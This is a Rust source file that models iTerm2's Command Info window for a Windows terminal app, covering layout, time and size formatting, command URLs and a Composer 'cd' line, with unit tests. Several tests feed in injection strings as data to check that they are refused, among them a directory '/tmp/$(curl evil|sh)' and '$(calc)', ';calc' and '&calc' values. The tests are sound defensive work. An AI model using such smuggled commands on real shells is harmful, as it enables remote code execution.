//! iTerm2's Command Info window, as a model: the fields it shows (command, directory, return
//! code, running time, output size, start time), the texts, and the command's URL
//! (`CommandInfoViewController.swift`, `String+iTerm.swift`). The window itself is
//! `cmdinfo_ui`; what its buttons do is `app/cmdinfo_app`.
//!
//! The command, the directory, the host and the user are text a program wrote between its own
//! prompt marks (B5): they are shown without controls and bidi characters and cut at
//! `MAX_SHOWN`, and written back to a terminal only through `pathnav::safe_text`.

use std::time::SystemTime;

pub const LABEL_COMMAND: &str = "Command:";
pub const LABEL_DIRECTORY: &str = "Directory:";
pub const LABEL_CODE: &str = "Return Code:";
pub const LABEL_RUNNING: &str = "Running Time:";
pub const LABEL_OUTPUT: &str = "Output:";
pub const STILL_RUNNING: &str = "Still Running";
pub const UNKNOWN: &str = "Unknown";
pub const COPIED: &str = "Copied";
pub const TIP_SEND_COMMAND: &str = "Write command to terminal";
pub const TIP_COPY_COMMAND: &str = "Copy command to clipboard";
pub const TIP_SHARE: &str = "Share command\u{2026}";
pub const TIP_SEND_DIRECTORY: &str = "Write directory to terminal";
pub const TIP_COPY_DIRECTORY: &str = "Copy directory";
pub const TIP_COPY_OUTPUT: &str = "Copy command\u{2019}s output";
pub const TIP_SELECT_OUTPUT: &str = "Select command\u{2019}s output";
pub const TIP_COMPOSER: &str = "Open command in Composer";
pub const ADD_SNIPPET: &str = "Add Command as Snippet";
pub const COPY_URL: &str = "Copy Command URL to Clipboard";
pub const SNIPPET_ADDED: &str = "Snippet Added";

/// The window's width in points (`CommandInfoViewController.xib`'s popover, a little wider for
/// Windows' text).
pub const WIDTH: f64 = 380.0;
/// Its margin and the height of a text row, a button row, and the share menu's rows, points.
pub const MARGIN: f64 = 12.0;
pub const ROW_H: f64 = 26.0;
pub const BUTTON_ROW_H: f64 = 34.0;
pub const SHARE_ROW_H: f64 = 28.0;
/// The gap between the click and the window, points.
pub const GAP: f64 = 12.0;
/// How long a "Copied" toast holds and then fades, seconds (`CIV:showCopiedToast`), and how
/// long "Snippet Added" holds (`duration: 1`).
pub const COPIED_HOLD: f32 = 0.7;
pub const FADE: f32 = 0.25;
pub const SNIPPET_HOLD: f32 = 1.0;
/// The toast's opacity while it holds (`alphaValue = 0.8`).
pub const TOAST_ALPHA: f32 = 0.8;

/// The window's height in points for its rows: five fixed ones (command, directory, return code,
/// running time, output), "Started at" only with a start time, the buttons, and the share
/// menu's two items while it is open.
pub fn height(has_start: bool, share_open: bool) -> f64 {
    2.0 * MARGIN + 5.0 * ROW_H + if has_start { ROW_H } else { 0.0 } + BUTTON_ROW_H + if share_open { 2.0 * SHARE_ROW_H + 4.0 } else { 0.0 }
}

/// Where a window of `pw` by `ph` pixels goes for a click at `at` (screen pixels): centered
/// under the pointer, above it when it would not fit below, and kept inside `work`.
pub fn place(at: (f64, f64), pw: f64, ph: f64, work: Option<crate::layout::Rect>, scale: f64) -> (f64, f64) {
    let gap = GAP * scale;
    let x = at.0 - pw / 2.0;
    let mut y = at.1 + gap;
    if let Some(r) = work {
        let bottom = f64::from(r.y) + f64::from(r.h);
        if y + ph > bottom {
            y = at.1 - gap - ph;
        }
        let (l, t) = (f64::from(r.x), f64::from(r.y));
        let (rr, b) = (l + f64::from(r.w), t + f64::from(r.h));
        return (x.min(rr - pw).max(l), y.min(b - ph).max(t));
    }
    (x.max(0.0), y.max(0.0))
}

/// A toast's opacity `age` seconds after it began: `TOAST_ALPHA` while it holds, fading to
/// nothing over `FADE`, None once gone.
pub fn toast_alpha(age: f32, hold: f32) -> Option<f32> {
    if age < hold {
        Some(TOAST_ALPHA)
    } else if age < hold + FADE {
        Some(TOAST_ALPHA * (1.0 - (age - hold) / FADE))
    } else {
        None
    }
}

/// The most characters of program text the window shows; the rest is an ellipsis.
pub const MAX_SHOWN: usize = 1000;
/// The most characters of the command or directory a button writes to the terminal.
pub const MAX_WRITE: usize = 4096;

/// What the window shows about one command.
#[derive(Clone, Debug, PartialEq)]
pub struct Info {
    pub mark: u32,
    pub command: String,
    pub directory: Option<String>,
    pub host: Option<String>,
    pub user: Option<String>,
    pub code: Option<i32>,
    pub start: Option<SystemTime>,
    pub end: Option<SystemTime>,
    pub output_bytes: u64,
    pub output_lines: usize,
    /// The command's program is still running in a live session (S5): an ended or restarted
    /// session leaves a mark with no code and no end, which is not running.
    pub running: bool,
    /// The command ran on this machine (the host is none or ours); only the URL reads it.
    pub local: bool,
}

pub use crate::pathnav::REFUSED;

impl Info {
    /// The running time row: the command's own times, or a ticking time while it runs.
    pub fn running_time(&self, now: SystemTime) -> String {
        match (self.start, self.end) {
            (Some(_), Some(_)) => running_text(self.start, self.end, now),
            (Some(_), None) if self.running => running_text(self.start, None, now),
            _ => UNKNOWN.to_string(),
        }
    }

    /// The return code row: `code_text`, with Unknown for a command that is neither finished
    /// nor running.
    pub fn code_shown(&self) -> (String, Option<char>, bool) {
        if self.code.is_none() && !self.running {
            return (UNKNOWN.to_string(), None, false);
        }
        code_text(self.code)
    }
}

/// Program text as the window shows it: controls, bidi and zero-width characters dropped, cut
/// at `MAX_SHOWN`.
pub fn shown(text: &str) -> String {
    let clean = crate::inert_files::clean_name(text);
    match clean.char_indices().nth(MAX_SHOWN) {
        Some((i, _)) => format!("{}\u{2026}", &clean[..i]),
        None => clean,
    }
}

/// The banner for text too long to write.
pub const TOO_LONG: &str = "Termurion did not write this text to the terminal: it is too long.";

/// Program text a button may write to the terminal, or the banner (B5).
pub fn writable(text: &str) -> Result<&str, String> {
    let text = crate::pathnav::safe_text(text).ok_or_else(|| REFUSED.to_string())?;
    if text.chars().nth(MAX_WRITE).is_some() {
        return Err(TOO_LONG.to_string());
    }
    Ok(text)
}

/// The Output row's numbers for an output text: its bytes and its lines (none for no output).
pub fn output_stats(text: Option<&str>) -> (u64, usize) {
    match text {
        Some(t) if !t.is_empty() => (t.len() as u64, t.lines().count()),
        _ => (0, 0),
    }
}

/// `TimeInterval.formattedHMS` (`CIV:455-466`): `h:mm:ss` from an hour, else `m:ss.mmm`.
pub fn hms(seconds: f64) -> String {
    let t = if seconds.is_finite() && seconds > 0.0 { seconds } else { 0.0 };
    let whole = t.floor();
    let secs = whole as u64;
    let (hours, minutes, s) = (secs / 3600, (secs % 3600) / 60, secs % 60);
    if hours > 0 {
        return format!("{hours}:{minutes:02}:{s:02}");
    }
    // The fraction as a float can sit a hair under its decimal (3599.999 is stored a little
    // low): the millisecond is read with that much slack, never past 999.
    let millis = (((t - whole) * 1000.0) + 1e-6).floor().min(999.0) as u64;
    format!("{minutes}:{s:02}.{millis:03}")
}

/// `NSString.stringWithHumanReadableSize` (`STR:159-185`): two digits, always rounded down, an
/// approximation sign when the value is not exact.
pub fn readable_size(bytes: u64) -> String {
    if bytes < 1024 {
        return format!("{bytes} bytes");
    }
    let (mut num, mut pow, mut exact) = (bytes, 0usize, true);
    while num >= 1024 * 1024 {
        pow += 1;
        if num % 1024 != 0 {
            exact = false;
        }
        num /= 1024;
    }
    if 100 * num % 1024 != 0 {
        exact = false;
    }
    num = 100 * num / 1024;
    let prefixes = ["Ki", "Mi", "Gi", "Ti", "Pi", "Ei"];
    format!("{}{}.{:02} {}", if exact { "" } else { "\u{2248}" }, num / 100, num % 100, prefixes[pow.min(prefixes.len() - 1)])
}

/// The Output row (`CIV:262-264`; `CommandInfo.LineCount` has an "one" and an "other" form).
pub fn output_text(bytes: u64, lines: usize) -> String {
    let count = if lines == 1 { "(1 line)".to_string() } else { format!("({lines} lines)") };
    format!("{} {count}", readable_size(bytes))
}

/// The return code as shown: its text, a Segoe Fluent Icons glyph (a check for 0, a stop sign
/// otherwise, none while running) and whether the text is red.
pub fn code_text(code: Option<i32>) -> (String, Option<char>, bool) {
    match code {
        Some(0) => ("0".to_string(), Some('\u{E73E}'), false),
        Some(c) => (c.to_string(), Some('\u{E711}'), true),
        None => (STILL_RUNNING.to_string(), None, false),
    }
}

pub fn running_text(start: Option<SystemTime>, end: Option<SystemTime>, now: SystemTime) -> String {
    let Some(start) = start else { return UNKNOWN.to_string() };
    // A clock that went back is zero, never negative.
    let span = end.unwrap_or(now).duration_since(start).unwrap_or_default();
    hms(span.as_secs_f64())
}

pub fn started_text(time: &str, date: &str) -> String {
    format!("Started at {time} on {date}")
}

pub fn command_url(command: &str, directory: Option<&str>, host: Option<&str>, user: Option<&str>, local: bool) -> String {
    // The host and user are program text: encoded, so they can add no path, port or query.
    let authority = match host.filter(|h| !local && !h.is_empty()) {
        Some(h) => match user.filter(|u| !u.is_empty()) {
            Some(u) => format!("//{}@{}", encode(u, false), encode(h, false)),
            None => format!("//{}", encode(h, false)),
        },
        None => String::new(),
    };
    let mut url = format!("iterm2:{authority}/command?c={}", encode(command, true));
    if let Some(d) = directory {
        url.push_str("&d=");
        url.push_str(&encode(d, true));
    }
    url
}

/// Percent-encodes `text`: everything but unreserved characters, and for a query value also
/// the sub-delimiters and `/ : @ ?` `URLComponents` leaves alone (`&`, `=`, `+` and `#` are
/// always encoded).
fn encode(text: &str, query: bool) -> String {
    let mut out = String::new();
    for b in text.bytes() {
        let keep = b.is_ascii_alphanumeric() || matches!(b, b'-' | b'.' | b'_' | b'~') || (query && matches!(b, b'/' | b':' | b'@' | b'$' | b'\'' | b'(' | b')' | b'*' | b',' | b';' | b'!' | b'?'));
        if keep {
            out.push(b as char);
        } else {
            out.push_str(&format!("%{b:02X}"));
        }
    }
    out
}

/// The Composer's text (`CIV:433-441`): `cd <directory>` quoted for the shell, then the
/// command. Err with the banner when a line could not be written safely (B5).
pub fn composer_text(command: &str, directory: Option<&str>, shell: Option<&str>) -> Result<String, String> {
    let command = writable(command)?;
    let kind = crate::pathnav::shell_of(shell);
    let mut lines = Vec::new();
    if let Some(d) = directory {
        let quoted = crate::pathnav::quote_for(writable(d)?, kind)?;
        // cmd.exe's cd stays on its drive without /d; only a shell known to be cmd gets it.
        let cd = if kind == crate::pathnav::Shell::Cmd { "cd /d" } else { "cd" };
        lines.push(format!("{cd} {quoted}"));
    }
    lines.push(command.to_string());
    Ok(lines.join("\n"))
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::time::{Duration, UNIX_EPOCH};

    #[test]
    fn composer_text_never_guesses_the_shell() {
        // A directory a program wrote: with no shell named it is refused, never quoted for cmd.exe.
        assert!(composer_text("make", Some("C:\\x$(calc)"), None).is_err());
        assert!(composer_text("make", Some("/tmp/$(curl evil|sh)"), None).is_err());
        assert_eq!(composer_text("make", Some("C:\\a b"), None).unwrap(), "cd \"C:\\a b\"\nmake");
        assert!(composer_text("make", Some("/tmp/x$(calc)"), Some("/bin/bash")).is_err(), "a named shell does not loosen the rule");
        assert_eq!(composer_text("make", Some("/tmp/a b"), Some("/bin/bash")).unwrap(), "cd /tmp/a\\ b\nmake");
        assert_eq!(composer_text("make", Some("C:\\a b"), Some("cmd")).unwrap(), "cd /d \"C:\\a b\"\nmake");
    }

    #[test]
    fn composer_at_a_drive_root_writes_the_root() {
        assert_eq!(composer_text("dir", Some("C:\\"), Some("cmd")).unwrap(), "cd /d \"C:\\.\"\ndir");
        assert_eq!(composer_text("dir", Some("C:\\"), Some("pwsh")).unwrap(), "cd 'C:\\.'\ndir");
    }

    #[test]
    fn hms_follows_iterm2() {
        assert_eq!(hms(0.0), "0:00.000");
        assert_eq!(hms(61.25), "1:01.250");
        assert_eq!(hms(3599.999), "59:59.999");
        assert_eq!(hms(3600.0), "1:00:00");
        assert_eq!(hms(5405.7), "1:30:05");
        // Nothing a clock can give breaks it.
        assert_eq!(hms(-3.0), "0:00.000");
        assert_eq!(hms(f64::NAN), "0:00.000");
        assert_eq!(hms(f64::INFINITY), "0:00.000");
    }

    #[test]
    fn readable_size_follows_iterm2() {
        assert_eq!(readable_size(12), "12 bytes");
        assert_eq!(readable_size(1023), "1023 bytes");
        assert_eq!(readable_size(1024), "1.00 Ki");
        assert_eq!(readable_size(1536), "1.50 Ki");
        assert_eq!(readable_size(1500), "\u{2248}1.46 Ki");
        assert_eq!(readable_size(1_048_576), "1.00 Mi");
        assert_eq!(readable_size(1_048_577), "\u{2248}1.00 Mi");
        assert_eq!(readable_size(u64::MAX), "\u{2248}15.99 Ei");
        assert_eq!(output_text(12, 1), "12 bytes (1 line)");
        assert_eq!(output_text(2048, 3), "2.00 Ki (3 lines)");
        assert_eq!(output_text(0, 0), "0 bytes (0 lines)");
    }

    #[test]
    fn command_info_fields_follow_iterm2() {
        assert_eq!(code_text(Some(0)), ("0".to_string(), Some('\u{E73E}'), false));
        assert_eq!(code_text(Some(2)), ("2".to_string(), Some('\u{E711}'), true));
        assert_eq!(code_text(None), ("Still Running".to_string(), None, false));
        let t = UNIX_EPOCH + Duration::from_secs(1_000_000);
        assert_eq!(running_text(Some(t), Some(t + Duration::from_millis(2500)), t), "0:02.500");
        assert_eq!(running_text(Some(t), None, t + Duration::from_secs(1)), "0:01.000");
        assert_eq!(running_text(None, None, t), "Unknown");
        // A clock that went back does not show a negative time.
        assert_eq!(running_text(Some(t), None, t - Duration::from_secs(5)), "0:00.000");
        assert_eq!(started_text("3:04:05 PM", "Oct 1, 2026"), "Started at 3:04:05 PM on Oct 1, 2026");
        assert_eq!(composer_text("make", Some(r"C:\a b"), Some("powershell")).unwrap(), "cd 'C:\\a b'\nmake");
        assert_eq!(composer_text("make", None, None).unwrap(), "make");
    }

    #[test]
    fn running_time_stops_when_the_program_is_gone() {
        let t = UNIX_EPOCH + Duration::from_secs(1_000_000);
        let mut info = Info { mark: 1, command: "x".into(), directory: None, host: None, user: None, code: None, start: Some(t), end: None, output_bytes: 0, output_lines: 0, running: true, local: true };
        assert_eq!(info.running_time(t + Duration::from_secs(2)), "0:02.000");
        assert_eq!(info.code_shown(), ("Still Running".to_string(), None, false));
        // S5: an ended session leaves no code and no end: not running, the time unknown.
        info.running = false;
        assert_eq!(info.running_time(t + Duration::from_secs(2)), "Unknown");
        assert_eq!(info.code_shown().0, "Unknown");
        // A finished command shows its own times whatever `running` says.
        info.end = Some(t + Duration::from_secs(3));
        info.code = Some(0);
        assert_eq!(info.running_time(t + Duration::from_secs(99)), "0:03.000");
        assert_eq!(info.code_shown().0, "0");
    }

    #[test]
    fn command_url_follows_iterm2() {
        assert_eq!(command_url("ls -l", Some("/tmp"), None, None, true), "iterm2:/command?c=ls%20-l&d=/tmp");
        assert_eq!(command_url("ls -l", Some("/tmp"), Some("h"), Some("u"), false), "iterm2://u@h/command?c=ls%20-l&d=/tmp");
        assert_eq!(command_url("ls", None, None, None, true), "iterm2:/command?c=ls");
        assert_eq!(command_url("a&b=c", None, None, None, true), "iterm2:/command?c=a%26b%3Dc");
        // A local host adds nothing; a remote host without a user adds only the host.
        assert_eq!(command_url("ls", None, Some("h"), Some("u"), true), "iterm2:/command?c=ls");
        assert_eq!(command_url("ls", None, Some("h"), None, false), "iterm2://h/command?c=ls");
        // Program text cannot add a path, a port or a second query: it is encoded.
        assert_eq!(command_url("ls", None, Some("h/x?y#z"), Some("u@v"), false), "iterm2://u%40v@h%2Fx%3Fy%23z/command?c=ls");
        assert_eq!(command_url("a\r\nb\u{1b}", None, None, None, true), "iterm2:/command?c=a%0D%0Ab%1B");
        assert_eq!(command_url("caf\u{e9} 100%", None, None, None, true), "iterm2:/command?c=caf%C3%A9%20100%25");
    }

    #[test]
    fn output_stats_count_bytes_and_lines() {
        assert_eq!(output_stats(None), (0, 0));
        assert_eq!(output_stats(Some("")), (0, 0));
        assert_eq!(output_stats(Some("one")), (3, 1));
        assert_eq!(output_stats(Some("l1\nl2\n\nl4")), (9, 4));
        assert_eq!(output_stats(Some("caf\u{e9}")), (5, 1));
    }

    #[test]
    fn the_window_is_placed_at_the_click_and_kept_on_screen() {
        use crate::layout::Rect;
        let work = Some(Rect { x: 0.0, y: 0.0, w: 1920.0, h: 1040.0 });
        // Under the pointer, centered.
        assert_eq!(place((500.0, 300.0), 380.0, 200.0, work, 1.0), (310.0, 312.0));
        // Above it when below would leave the work area.
        assert_eq!(place((500.0, 1000.0), 380.0, 200.0, work, 1.0), (310.0, 788.0));
        // Kept inside at the edges; the gap scales.
        assert_eq!(place((10.0, 300.0), 380.0, 200.0, work, 1.0).0, 0.0);
        assert_eq!(place((1915.0, 300.0), 380.0, 200.0, work, 1.0).0, 1540.0);
        assert_eq!(place((500.0, 300.0), 760.0, 400.0, work, 2.0), (120.0, 324.0));
        assert_eq!(place((10.0, 10.0), 100.0, 50.0, None, 1.0), (0.0, 22.0));
        assert!(height(true, true) > height(true, false) && height(true, false) > height(false, false));
    }

    #[test]
    fn toasts_hold_then_fade() {
        assert_eq!(toast_alpha(0.0, COPIED_HOLD), Some(0.8));
        assert_eq!(toast_alpha(0.69, COPIED_HOLD), Some(0.8));
        let mid = toast_alpha(0.825, COPIED_HOLD).unwrap();
        assert!((mid - 0.4).abs() < 1e-3, "{mid}");
        assert_eq!(toast_alpha(0.96, COPIED_HOLD), None);
        assert_eq!(toast_alpha(0.99, SNIPPET_HOLD), Some(0.8));
    }

    #[test]
    fn shown_text_is_clean_and_bounded() {
        assert_eq!(shown("a\u{1b}[31m\r\nb\u{202e}c\u{200b}d"), "a[31mbcd");
        let long = "x".repeat(MAX_SHOWN + 50);
        let cut = shown(&long);
        assert_eq!(cut.chars().count(), MAX_SHOWN + 1);
        assert!(cut.ends_with('\u{2026}'));
        assert_eq!(shown("ls"), "ls");
    }

    #[test]
    fn writes_refuse_what_a_program_could_type_into_a_shell() {
        assert_eq!(writable("dir").unwrap(), "dir");
        for bad in ["x\r calc", "x\ny", "x\u{1b}[2J", "x\u{7f}", "x\u{85}y", "x\u{202e}y", "x\u{200b}y"] {
            assert_eq!(writable(bad), Err(REFUSED.to_string()), "{bad:?}");
        }
        assert_eq!(writable(&"y".repeat(MAX_WRITE + 1)), Err(TOO_LONG.to_string()));
        assert!(writable(&"y".repeat(MAX_WRITE)).is_ok());
        assert!(REFUSED.contains("control character"));
    }

    #[test]
    fn a_spoofed_shell_name_never_loosens_the_composer_line() {
        // Fix round 2, item 1: whatever shell a program reports (OSC 1337 shell=, RemoteHost), the
        // directory is written only when no supported shell reads anything special in it.
        for shell in [None, Some("cmd"), Some("bash"), Some("sh"), Some("pwsh"), Some("/bin/zsh")] {
            for dir in ["C:\\x$(calc)", "C:\\x\\;calc", "C:\\x&calc", "C:\\x`calc`", "C:\\a\u{201e} x \u{201e}", "C:\\a\u{ff02}b", "C:\\a\u{2032}b", "C:\\x\\"] {
                assert!(composer_text("make", Some(dir), shell).is_err(), "{shell:?} {dir}");
            }
        }
        // Item 2: a network directory is never written either.
        for dir in ["\\\\evil\\s\\x", "//evil/s/x", "/\\evil/s"] {
            assert!(composer_text("make", Some(dir), Some("pwsh")).is_err(), "{dir}");
        }
    }

    #[test]
    fn composer_text_never_carries_a_control_character() {
        assert!(composer_text("make\r\ncalc", None, None).is_err());
        assert!(composer_text("make", Some("C:\\a\r\nb"), Some("pwsh")).is_err());
        // A directory a shell would read as syntax is quoted for that shell.
        assert!(composer_text("make", Some("C:\\a'b\u{2019}; calc"), Some("pwsh")).is_err());
        assert_eq!(composer_text("make", Some("/a b"), Some("bash")).unwrap(), "cd /a\\ b\nmake");
        assert!(composer_text("make", Some("C:\\100%"), Some("cmd")).is_err());
    }
}
